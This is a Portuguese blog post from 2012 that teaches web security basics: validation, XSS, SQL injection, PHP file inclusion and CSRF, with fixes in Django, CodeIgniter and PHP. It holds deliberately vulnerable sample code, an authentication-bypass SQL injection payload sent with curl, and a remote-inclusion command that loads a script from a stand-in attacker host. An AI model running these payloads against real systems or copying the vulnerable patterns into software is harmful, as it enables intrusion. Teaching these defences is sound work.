---
title: "Problemas comuns de segurança em aplicações Web"
date: 2012-04-15 18:03:48
tags:
  [
    "desenvolvimento-web",
    "segurança",
    "xss",
    "csrf",
    "sql-injection",
    "php-injection",
    "django",
    "php",
    "codeigniter",
  ]
slug: problemas-de-seguranca-em-aplicacoes-web
thumbnail: /images/security.jpg
---

Seria perfeito se o mundo fosse feito apenas de pessoas
bem-intencionadas. Acontece que é mais fácil os alienígenas exterminarem
a raça humana, do que o homem deixar de tirar proveito de alguma
situação.

Quando estamos desenvolvendo nossas aplicações [*web*][], temos que
“pensar” como um usuário mal-intencionado. Não somente para garantir o
bom funcionamento da mesma, mas também para garantir a segurança e
bem-estar dos “usuários civis” que consomem os nossos serviços.

Vamos explorar alguns problemas relacionados a segurança, e mostrar como
solucioná-los de forma simples e prática.

## Use frameworks!

E esta é a minha primeira dica para você: use _frameworks_ sempre que
possível!

Eles já possuem um conjunto de ferramentas que contornam problemas como
_SQL Injection_, _XSS_ e _CSRF_. Pessoas muito inteligentes já pensaram no
problema e já solucionaram para você. Na maioria dos casos, mais de uma vez!

Em alguns _frameworks_, como o [*Django*][] e [*Codeigniter*][], essas
ferramentas são quase “transparentes”, ou seja, você tem pouco (ou
nenhum) trabalho para utilizá-las no cotidiano.

Já trabalhei por muito tempo com “desenvolvimento from scratch”, e hoje
posso apontar vários pontos de falhas em aplicações que produzi no
passado. Os _frameworks_ diminuem muito estes pontos, por isso vale a
pena o seu uso.

## Validações (nunca confie no usuário)

Como eu comecei com o [*PHP*][], sei muito bem que este é um problema
comum em aplicações desenvolvidas por iniciantes.

**Nunca confie no usuário**, e principalmente **nunca confie em
validações realizadas pelo [*Javascript*][]**. Todo ponto de entrada de
informação deve possuir uma validação no _server-side_, mesmo que exista
uma validação no _client-side_. **Lembre-se:** Existem navegadores que
não utilizam _Javascript_, e mesmo os que utilizam, permitem que o
usuário desabilite esta função.

No _Django_, podemos fazer validações de formulários através de
[*Forms*][]. No _Codeigniter_ fazemos através da [*Form Validation Class*][].
Em _PHP_ “puro”, podemos fazer validações através da [biblioteca *Validate*][].

As ferramentas citadas acima são extremamente eficientes para ações
realizadas via _POST_. Mas e quando temos parâmetros vindos da _URL_,
através do método _GET_, qual é a melhor maneira de agirmos?

### URLs seguras e amigáveis

Há um bom tempo que as “URLs amigáveis” deixaram de ser um diferencial
nas aplicações _web_ e tornaram-se item obrigatório. Além de trazer o
benefício do [*SEO*][], elas podem ser uma grande aliada quando o
assunto é segurança.

_URLs_ que antes eram feitas dessa maneira:

```text
/blog.php?year=2012&month=12&day=21
```

Podem ser reproduzidas desta forma:

```text
/blog/2012/12/21/
```

O mecanismo de rotas de alguns _frameworks_ permite a utilização de
expressões regulares na construção do caminho. Por exemplo, em _Django_
temos o seguinte cenário:

```python
# urls.py

urlpatterns = patterns('',
    ...
    (r'^blog/(?P<year>\d{4})/(?P<month>[0-9]{2})/(?P<day>\d{2})/$', 'blog.views.index'),
    ...
)
```

Determinamos que a rota inicia-se por `blog`, sendo composta por um
valor numérico de 4 dígitos que atende pelo identificador `year`,
outro valor de dois dígitos, indo de 0 a 9, chamado `month`, e o
último um valor numérico de 2 dígitos chamado `day`.

A verificação é feita no momento da requisição. Se a rota informada
bater com o padrão criado, ele executa a _view_ `blog.views`. Caso
contrário, se a rota não bater com nenhum padrão informado (por exemplo,
`/blog/2012/aa/21/`), o usuário tomará um erro 404.

Em nossa _view_, resgataríamos esses valores da seguinte forma:

```python
# blog/views.py

def index(request, year, month, day):
    # Lógica de renderização...
```

Simples assim! Temos um “input” de informação através de _GET_, onde
temos certeza do seu tipo e tamanho.

O mesmo resultado pode ser obtido com o _Codeigniter_, basta adicionar a
expressão desejada em seu `application/config/routes.php`:

```php
# application/config/routes.php

$route['blog/(\d{4})/([0-9]{2})/(\d{2})'] = "blog/index/$1/$2/$3";
```

Aos invés de utilizarmos identificadores, utilizamos a ordem dos grupos
criados na expressão regular.

Você não precisa utilizar um _framework_ para ter um esquema de rotas
como ilustrado acima. Um resultado parecido pode ser atingido através do
[*Nginx*][] e do _Apache_ com _mod-rewrite_. [Veja um exemplo de uso][]
apresentado numa _thread_ do _Stack Overflow_.

É claro que verificações mais complexas, como por exemplo, se o nome do
usuário informado na _URL_ é válido, necessitam de regras específicas,
muito provavelmente escritas dentro da _view_. Um ponto de falha que
vale ressaltar é a criação de expressões regulares “genéricas”, que não
discriminam o tipo e tamanho dos valores informados.

### Verificação de tipos de dados

Mas e quando não temos como fugir de um valor passado via _GET_? Pode
acontecer! Por exemplo, em paginações (onde normalmente passamos um
valor `page` como parâmetro), ou em uma busca (onde passamos o valor
pesquisado via _GET_).

Nesse caso, “forçamos” o tipo do dado informado, e diminuímos problemas
de interpretação do nosso código:

```php
<?php

$page = isset($_GET['page']) && preg_match('/^\d+$/', $_GET['page']) ? $_GET['page'] : 1;

?>
```

A solução acima não é infalível, mas é uma maneira de diminuírmos a
incidência de erros. Se um valor diferente de inteiro positivo for
passado, a página a ser exibida será a primeira.

## XSS – Cross-Site Scripting (não confie na informação)

É certo que, validando toda e qualquer
informação que a sua aplicação receber, você diminuirá muito a
ocorrência de problemas. Mas, mesmo confiando no tipo e nas dimensões da
informação, não podemos confiar no seu conteúdo.

Imagine que você possua um _blog_. Só você pode escrever artigos nele,
então você conhece o conteúdo da informação sendo produzida. Certo dia
você resolve que os usuários poderão comentar no seu _blog_, e
desenvolve uma ferramenta de comentários com todas as validações citadas
anteriormente.

Até que em certo momento, um usuário mal-intencionado **escreve um
comentário** no seu _post_, e neste comentário existe um **_script_**
_Javascript_ que explora uma **falha de segurança** do _ActiveX_ (por
exemplo). Logo, todos os leitores que utilizam _Internet Explorer_ e
leram o seu _post_ são infectados por um _malware_ que o seu _blog_
ajudou a proliferar.

A injeção de um _script_ em um _website_, através de campos de textos ou
passagem de parâmetros, é caracterizado como um ataque de **_Cross-Site
Scripting_** (ou _XSS_).

Uma maneira muito comum de evitar esse tipo de problema é simplesmente
“escapando” ou removendo elementos _HTML_ do conteúdo:

```php
<?php
# xss.php

$var = $_GET['var'];

echo htmlspecialchars($var);

?>
```

Acessar `xss.php` com um `alert` _Javascript_ como parâmetro, não
executará o comando, e sim apenas exibirá o conteúdo na tela, com os
caracteres que delimitam o elemento `script` devidamente formatados:

```text
http://localhost/xss.php?var=&lt;script&gt;alert("XSS!");&lt;/script&gt;
```

Existem alguns [*Rich Text Editors*][] que verificam e formatam o
conteúdo do campo antes de uma submissão. Mas **lembre-se**! Editores
_WYSIWYG_ são basicamente _Javascript_, logo, se eu desabilitar o
_Javascript_ do meu navegador, posso enviar _scripts_ maliciosos sem
impeditivo nenhum, por isso, é sempre necessário fazermos esse tipo de
validação no _server-side_.

O _Codeigniter_, com a opção `$config['global_xss_filtering’]` como
`TRUE`, filtra automaticamente os dados resgatados de _GET_ ou _POST_.
O que acho bacana desse filtro, é que ele previne apenas a injeção de
_scripts_ e atributos que podem de alguma forma prejudicar na segurança
da sua aplicação, não necessariamente formatando o conteúdo todo.

Este tratamento está ativo por padrão no _engine_ de _templates_ do
_Django_. Embora isso não impeça o armazenamento do _script_ no banco de
dados, impede que a sua renderização afete os usuários da sua aplicação.

Uma outra forma muito bacana de prevenir este tipo de inconveniente é
utilizando uma linguagem de marcação alternativa, como _Textile_ e
_Markdown_, em campos de textos abertos.

## SQL Injection (não confie em sua aplicação)

Entre as vulnerabilidades citadas, acredito que o
**_SQL Injection_** é uma das mais
destrutivas, tanto para a sua aplicação, quanto para os seus usuários.

Segundo o _Wikipedia_:

> É um tipo de ameaça de segurança que se aproveita de falhas em
> sistemas que interagem com bases de dados via SQL. A injeção de
> SQL ocorre quando o atacante consegue inserir
> uma série de instruções SQL dentro de uma
> consulta (query) através da manipulação das entrada de dados de uma
> aplicação.

Os resultados podem ser os mais desastrosos, como por exemplo, o acesso
de usuários não autorizados a áreas restritas, e o roubo de informações
da sua base de dados. Abaixo, uma autenticação simples, utilizando nome
de usuário e senha:

```php
<?php
# sql-injection.php

if (isset($_POST['usuario']) && isset($_POST['senha'])) {
    $usuario    = $_POST['usuario'];
    $senha      = $_POST['senha'];

    // Abre conexão com o banco de dados
    $link = mysql_connect('localhost', 'root', '');
    // Seleciona a base de dados
    mysql_select_db('exemplos_blog');

    // Faz a consulta ao banco, comparando usuário e senha
    $query = "SELECT 1 FROM usuario WHERE usuario = '{$usuario}' "
        . "AND senha = '{$senha}'";
    $result = mysql_query($query) or die("Query inválida: "
        . mysql_error() . "\n");

    mysql_close($link);

    if (mysql_num_rows($result)) {
        // Vai para a página logada
        echo 'Login com sucesso';
    } else {
        // Errou o usuário e senha, volta para a página de login
        echo 'Usuário e senha inválidos';
    }
} else {
    // Vai para a página de login
}

?>
```

Levando em consideração que temos um usuário com nome `teste` e senha
`teste`, se executarmos a instrução abaixo, será exibida uma mensagem
de _login_ inválido:

```text
$ curl --data "usuario=foo&senha=bar" http://localhost/sql-injection.php

Usuário e senha inválidos
```

Evidente! Este usuário não existe no banco de dados. Mas, podemos
imaginar que a aplicação não possua proteção contra injeções _SQL_,
então podemos fazer com que a consulta retorne positivo, e que nosso
acesso seja garantido mesmo não possuindo um usuário no banco de dados.

```text
$ curl --data "usuario=foo&senha=bar' OR '1' = '1" http://localhost/sql-injection.php

Login com sucesso
```

A nossa _query_, por não fazermos um tratamento nos campos do
formulário, foi composta pelo valor `bar’ OR '1’ = ’1`, o que resultou
no seguinte _SQL_:

```sql
SELECT 1 FROM usuario
WHERE usuario = 'foo' AND senha = 'bar' OR '1' = '1'
```

Existem algumas soluções para este problema, como o uso de
`addslashes` no _PHP_, mas os que fazem mais sentido para mim são:

- O uso da função `mysql_real_escape_string` para formatar dados
  antes de construir a _query_;
- O uso da classe `mysqli` para consultas a bancos de dados _MySQL_,
  ao invés do uso das funções _mysql_.

A primeira é a mais prática de aplicarmos. No código anterior, bastaria
formatar os valores na hora que são resgatados do _array_ `$_POST`:

```php
$usuario    = mysql_real_escape_string($_POST['usuario']);
$senha      = mysql_real_escape_string($_POST['senha']);
```

Com o **mysqli**, precisamos fazer algumas alterações no código, como
demonstrado abaixo:

```php
<?php
    # sql-injection.php (com mysqli)

    if (isset($_POST['usuario']) && isset($_POST['senha'])) {
        $usuario    = $_POST['usuario'];
        $senha      = $_POST['senha'];

        // Abre conexão com o banco de dados
        $mysqli = new mysqli('localhost', 'root', '', 'exemplos_blog');
        // Faz a consulta ao banco, comparando usuário e senha
        $query = $mysqli->prepare("SELECT 1 FROM usuario WHERE usuario = ? "
            . "AND senha = ?");
        $query->bind_param('ss', $usuario, $senha);
        $query->execute();
        $query->store_result();

        $num_rows = $query->num_rows;

        $query->close();

        if ($num_rows) {
            // Vai para a página logada
            echo 'Login com sucesso';
        } else {
            // Errou o usuário e senha, volta para a página de login
            echo 'Usuário e senha inválidos';
        }
    } else {
        // Vai para a página de login
    }
?>
```

Mas como o mundo não é feito só de _MySQL_, se ocorrer de você utilizar
um outro banco de dados, eu recomendo o uso da biblioteca [*PDO*][].

Como o [*Django* utiliza *ORM*][], e o [*Codeigniter* tem a *Active
Record Class*][], nesses _frameworks_ essa validação é feita no momento
que interagimos com os seus _models_. Mas é sempre bom ter cuidado!
Principalmente quando o _ORM_ não atende o nosso requisito, e temos que
partir para consultas _SQL_ puras.

### Senhas criptografadas

Uma boa dica é, sempre que persistirmos um usuário em nossa base de
dados, armazenarmos a sua senha criptografada em um formato “sem volta”
(conhecido como _hash_). Além de ser um princípio ético, que na minha
opinião todo o desenvolver de aplicações deveria ter, garantimos que
mesmo que a nossa aplicação seja invadida, as senhas dos usuários
estarão “seguras”.

Embora o [*MD5*][] e o [*SHA1*][] sejam as escolhas mais populares, os
desenvolvedores do _Django_ [recomendam o uso de algoritmos mais sofisticados][],
como o [*PBKDF2*][], por acreditarem que o poder
computacional atingiu um nível, que senhas _MD5_ e _SHA1_ podem com
considerável esforço ser quebradas.

## PHP Injection (não confie no PHP)

Embora esta técnica possa acontecer em outras linguagens, o _PHP_ dá
muita margem para desenvolvedores menos experientes deixarem brechas
para uma vulnerabilidade conhecida como **_PHP
Injection_**.

Com o site dividido em seções, é comum termos inclusões de arquivos
_PHP_ para compor uma página. Para economizar esforço e linhas de
código, deixamos as partes como menu e topo “estáticas”, e só alteramos
o conteúdo do bloco principal da página. Acontece que em alguns casos, o
desenvolvedor espera que um determinado arquivo seja importado de acordo
com a _URL_ que o internauta está visitando. Por exemplo:

```php
<?php
# php-injection.php

$page = $_GET['page'];

include('topo.php');
include('menu.php');

include($page);

?>
```

Logo:

```text
$ curl http://localhost/php-injection.php?page=novidades.php
```

No caso acima, estamos incluindo o arquivo `novidades.php` e
automaticamente exibindo o seu conteúdo. Podemos navegar por outras
áreas do _website_, por exemplo, `page=contato.php` ou
`page=institucional.php`. Mas, e se informarmos
`page=php-injection.php`?

Caímos num _looping_ infinito!

E, infelizmente, esse é o menor dos nossos problemas. O _PHP_, quando
configurado com a opção `allow_url_include` como `TRUE`, é capaz
de importar arquivos de outros _hosts_. Logo, o atacante pode ter um
_script_ malicioso hospedado em seu servidor, e passar o caminho dele
para a aplicação acima. A aplicação incluirá e interpretará o _PHP_ que
estiver neste _script_:

```text
$ curl http://localhost/php-injection.php?page=http://sitedoatacante.com.br/meu-script-malicioso.php.txt
```

Pronto! Temos código _PHP_ de outra pessoa executando em nosso servidor.

Para resolver este problema, configure a opção `allow_url_include`
em seu `php.ini` como `FALSE`. Outro passo importante é, sempre que
for importar algum arquivo que dependa de informações vindas do usuário,
verifique o conteúdo desta informação. Exemplo:

```php
switch($page) {
    case 'novidades':
        include('novidades.php');
        break;
    case 'contato':
        include('contato.php');
        break;
    case 'institucional':
        include('institucional.php');
        break;
    default:
        include('404.php');
}
```

Este ataque não é tão incomum quanto deveria. Fique atento.

## CSRF – Cross-site request forgery (não confie na requisição)

O **_Cross-site request forgery_** ou **falsificação de solicitação
entre sites**, é uma forma de ataque que mescla a [Engenharia Social][]
com vulnerabilidades das aplicações _web_.

O ataque pode ser feito da seguinte forma:

- Você recebe um _e-mail_ com uma _URL_ oculta (geralmente algum
  _e-mail_ do tipo “Veja as minhas fotos” (: )
- Esta _URL_ executa alguma ação em uma aplicação que você esteja
  autenticado no momento (por exemplo, o _Facebook_)
- Esta ação pode, tanto dar poderes de acesso ao atacante, quanto
  alterar ou remover os seus dados permanentemente

Note que o primeiro item pode ser substituído por algum **conteúdo
_link_ injetado via _XSS_** em algum fórum ou área de comentários de um
_blog_.

Embora o exemplo acima não represente tanta ameaça, existem vários tipos
de aplicações que este tipo de técnica pode afetar. O exemplo do banco,
encontrado no _site_ [*The Open Web Application Security Project*][], é
um excelente exempo de ataque _CSRF_.

Para prevenir este tipo de problema, podemos fazer um controle através
de [sessões][] e transmitir um _token_ que identifique que a requisição
foi de fato feita pelo usuário. _Kinn Coelho Julião_ escreveu [um *post* interessante para o *PHP-SP*][],
demonstrando como prevenir ataques _CSRF_ através de _token_.

De fato, tanto o _Django_ quanto o _Codeigniter_ utilizam essa tática
para prevenir ataques _CSRF_. No _Django_, com o _middleware_
`django.middleware.csrf.CsrfViewMiddleware`, basta adicionar a chamada
da _templatetag_ ao formulário:

```django-html
<form method="post" action=".">
    {% csrf_token %}
    ...
</form>
```

A _templatetag_ acima criará um campo oculto no formulário chamado
`csrfmiddlewaretoken`. Quando um _POST_ for realizado para a _view_ em
questão, caso o conteúdo de `csrfmiddlewaretoken` vindo do formulário
não “bata” com o conteúdo armazenado em sessão, o _Django_ entende que
aquela requisição não foi feita de maneira “natural” (ou seja, acessando
o formulário e submetendo-o). Logo, fica subentendido que aquela
requisição veio de outra origem, e o _framework_ não executa as
instruções da _view_ (retornando um código 403).

No _Codeigniter_, com a opção `$config['csrf_protection’]` como
`TRUE` no arquivo `application/config/config.php`, o _framework_
adicionará automaticamente o campo de proteção _CSRF_ na abertura do
formulário:

```php
<?php form_open(); ?>
```

## Considerações finais

Ficou um _post_ grande, mas acredito que consegui cobrir os problemas de
segurança mais conhecidos em aplicações _Web_. Como é possível notar,
são vulnerabilidades que são facilmente contornáveis, mas que podem
trazer sérios problemas para você e seus usuários caso a sua aplicação
não esteja segura o bastante.

Reforço: Se você tiver a oportunidade de utilizar um _framework_,
utilize! Eles possuem soluções prontas e bem testadas para prevenir os
problemas citados acima, e outros tantos que surgem a cada dia na
_internet_.

## Referências

- [*Caugh in a Web: Validating an integer in PHP*][]
- [*Codeigniter User Guide: Active Record Class*][]
- [*Codeigniter User Guide: Security*][]
- [*Django Documentation: Making queries*][]
- [*Django Documentation: Security in Django*][]
- [Invasão.com.br: *PHP Injection* – O fim das dúvidas][]
- [*PHP Documentation: MySQL Melhorada*][]
- [*PHP Documentation: PDO – PHP Data Objects*][]
- [*PHP SP*: Protegendo o seu sistema contra ataques *CSRF*][]
- [*Site Point: Top 7 PHP Security Blunders Article*][]
- [*Stack Overflow: Best way to stop SQL injection in PHP*][]
- [*The Open Web Application Security Project: Cross-Site Request Forgery*][]
- [*Wikipedia: Code Injection*][]
- [*Wikipedia*: Injeção de *SQL*][]

[*web*]: /tag/desenvolvimento-web.html "Leia mais sobre Web"
[*django*]: /tag/django.html "Leia mais sobre Django"
[*codeigniter*]: /tag/codeigniter.html "Leia mais sobre Codeigniter"
[*php*]: /tag/php.html "Leia mais sobre PHP"
[*javascript*]: /tag/javascript.html "Leia mais sobre Javascript"
[*forms*]: https://docs.djangoproject.com/en/dev/topics/forms/ "Conheça os Forms no Django"
[*form validation class*]: http://codeigniter.com/user_guide/libraries/form_validation.html "Veja como fazer validações de formulário no Codeigniter"
[biblioteca *validate*]: http://pear.php.net/manual/en/package.validate.validate.intro.php "Instale a Validate através da PEAR"
[*seo*]: http://pt.wikipedia.org/wiki/Otimiza%C3%A7%C3%A3o_para_motores_de_busca "Leia mais sobre SEO no Wikipedia"
[*nginx*]: /tag/nginx.html "Leia mais sobre Nginx"
[veja um exemplo de uso]: http://stackoverflow.com/questions/812571/how-to-create-friendly-url-in-php "Como criar rotas para arquivos PHP com o Apache"
[*rich text editors*]: http://www.webdesignerdepot.com/2008/12/20-excellent-free-rich-text-editors/ "Conheça 20 excelentes editores WYSIWYG"
[*pdo*]: http://php.net/pdo "Conheça a lib PDO do PHP"
[*django* utiliza *orm*]: https://docs.djangoproject.com/en/1.4/topics/db/queries/ "Making queries"
[*codeigniter* tem a *active record class*]: http://codeigniter.com/user_guide/database/active_record.html "Active Record Class"
[*md5*]: http://pt.wikipedia.org/wiki/MD5 "Conheça o algoritmo MD5"
[*sha1*]: http://pt.wikipedia.org/wiki/SHA1 "Conheça o algoritmo SHA1"
[recomendam o uso de algoritmos mais sofisticados]: https://docs.djangoproject.com/en/dev/releases/1.4/#improved-password-hashing "Leia a release note do Django 1.4"
[*pbkdf2*]: http://en.wikipedia.org/wiki/PBKDF2 "Conheça o algoritmo PBKDF2"
[engenharia social]: http://pt.wikipedia.org/wiki/Engenharia_social_(seguran%C3%A7a_da_informa%C3%A7%C3%A3o) "Leia mais sobre Engenharia Social no Wikipedia"
[*the open web application security project*]: https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF) "Leia mais sobre CSRF"
[sessões]: /2012/04/05/entendendo-os-cookies-e-sessoes.html "Entendendo o Cookies e Sessões"
[um *post* interessante para o *php-sp*]: http://phpsp.org.br/2011/07/protegendo-seu-sistema-contra-ataques-csrf/ "Protegendo seus sistemas contra ataques CSRF"
[*caugh in a web: validating an integer in php*]: http://www.dinke.net/blog/en/2011/10/20/validating-an-integer-with-php/ "As diferentes formas de validarmos um valor inteiro em PHP"
[*codeigniter user guide: active record class*]: http://codeigniter.com/user_guide/database/active_record.html "Saiba como fazer consultas eficientes ao banco de dados com o Codeigniter"
[*codeigniter user guide: security*]: http://codeigniter.com/user_guide/general/security.html "Veja as dicas de segurança dadas pelo time do Codeigniter"
[*django documentation: making queries*]: https://docs.djangoproject.com/en/1.4/topics/db/queries/ "Saiba como construir modelos e como consultá-los através do ORM do Django"
[*django documentation: security in django*]: https://docs.djangoproject.com/en/dev/topics/security/ "Veja dicas preciosas de segurança utilizando o Django"
[invasão.com.br: *php injection* – o fim das dúvidas]: http://www.invasao.com.br/2008/03/18/php-injection-o-fim-das-duvidas/ "Entenda como funciona um ataque via PHP Injection"
[*php documentation: mysql melhorada*]: http://www.php.net/manual/pt_BR/book.mysqli.php "Conheça a mysqli direto da documentação do PHP"
[*php documentation: pdo – php data objects*]: http://php.net/pdo "Conheça uma das formas mais eficientes de fazer consultas a bancos de dados no PHP"
[*php sp*: protegendo o seu sistema contra ataques *csrf*]: http://phpsp.org.br/2011/07/protegendo-seu-sistema-contra-ataques-csrf/ "Aprenda como utilizar tolkens para prevenir ataques CSRF"
[*site point: top 7 php security blunders article*]: http://www.sitepoint.com/php-security-blunders/ "Excelentes dicas de segurança para quem programa em PHP"
[*stack overflow: best way to stop sql injection in php*]: http://stackoverflow.com/questions/60174/best-way-to-stop-sql-injection-in-php "Excelente thread no Stack Overflow, sobre SQL injection"
[*the open web application security project: cross-site request forgery*]: https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF) "Um bom artigo sobre o conceito do CSRF"
[*wikipedia: code injection*]: http://en.wikipedia.org/wiki/Code_injection "Leia mais sobre as formas de injeção de código no Wikipedia"
[*wikipedia*: injeção de *sql*]: http://pt.wikipedia.org/wiki/Inje%C3%A7%C3%A3o_de_SQL "Leia mais sobre SQL Injection no Wikipedia"
